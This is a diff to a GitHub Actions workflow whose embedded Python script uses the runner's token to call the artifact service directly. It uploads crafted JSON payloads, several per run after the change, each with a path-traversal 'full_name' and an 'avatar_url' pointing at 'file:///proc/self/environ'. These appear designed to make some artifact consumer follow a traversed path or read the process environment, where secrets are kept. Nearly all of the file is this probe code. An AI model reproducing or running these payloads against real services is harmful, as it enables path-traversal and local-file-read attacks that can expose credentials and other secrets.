@@ -2,15 +2,9 @@ name: disamb85
 on:
   workflow_dispatch:
     inputs:
-      artname:
-        description: artifact name
-        default: payload.json
-      mimetype:
-        description: CreateArtifact mime_type
-        default: application/xml
-      putct:
-        description: PUT Content-Type
-        default: text/plain
+      specs:
+        description: JSON array of {v, mime}
+        default: '[]'
 jobs:
   up:
     runs-on: ubuntu-latest
@@ -20,36 +14,34 @@ jobs:
       - uses: actions/checkout@v5
       - uses: ./.github/actions/rawup
         with:
-          artname: ${{ inputs.artname }}
-          mimetype: ${{ inputs.mimetype }}
-      - name: re-put with own id and finalize
-        env:
-          PUTCT: ${{ inputs.putct }}
+          specs: ${{ inputs.specs }}
+      - name: re-put payloads
         run: |
           set -eu
           python3 - <<'PY'
-          import json, hashlib, os, urllib.request
+          import json, hashlib, urllib.request
           s = json.load(open('/tmp/rawup_state.json'))
-          X = s['artifactId']
-          repo_str = 'a/../../repos/lemonsour864/cassette/actions/artifacts/%s/zip' % X
-          P = json.dumps({"full_name": repo_str,
-                          "owner": {"login": "lemonsour864", "avatar_url": "file:///proc/self/environ"},
-                          "stargazers_count": 0, "description": "probe"},
-                         separators=(',', ':')).encode()
-          print('repo_str:', repo_str)
-          ct = os.environ['PUTCT']
-          req = urllib.request.Request(s['signedUploadUrl'], data=P, method='PUT',
-              headers={'Content-Type': ct, 'x-ms-blob-type': 'BlockBlob'})
-          print('PUT real:', urllib.request.urlopen(req, timeout=60).status)
           def post(path, obj):
               req = urllib.request.Request(s['base'] + path, data=json.dumps(obj).encode(),
                   headers={'Content-Type': 'application/json', 'Authorization': 'Bearer ' + s['token']}, method='POST')
               return json.load(urllib.request.urlopen(req, timeout=30))
-          try:
-              r = post('/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact',
-                       {'workflow_run_backend_id': s['runId'], 'workflow_job_run_backend_id': s['jobId'], 'name': s['name'],
+          for a in s['artifacts']:
+              if not a.get('created'): continue
+              X = a['artifactId']
+              repo_str = 'a/../../repos/lemonsour864/cassette/actions/artifacts/%s/zip' % X
+              P = json.dumps({"full_name": repo_str,
+                              "owner": {"login": "lemonsour864", "avatar_url": "file:///proc/self/environ"},
+                              "stargazers_count": 0, "description": "probe"},
+                             separators=(',', ':')).encode()
+              req = urllib.request.Request(a['up'], data=P, method='PUT',
+                  headers={'Content-Type': 'application/json', 'x-ms-blob-type': 'BlockBlob'})
+              st = urllib.request.urlopen(req, timeout=60).status
+              fin = 'ok'
+              try:
+                  post('/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact',
+                       {'workflow_run_backend_id': s['runId'], 'workflow_job_run_backend_id': s['jobId'], 'name': a['name'],
                         'size': str(len(P)), 'hash': 'sha256:' + hashlib.sha256(P).hexdigest()})
-              print('Finalize2:', json.dumps(r)[:300])
-          except Exception as e:
-              print('Finalize2 failed (continuing):', e)
+              except Exception as e:
+                  fin = 'failed: %s' % e
+              print('SPEC', a['i'], 'id', X, 'reput', st, 'fin2', fin)
           PY
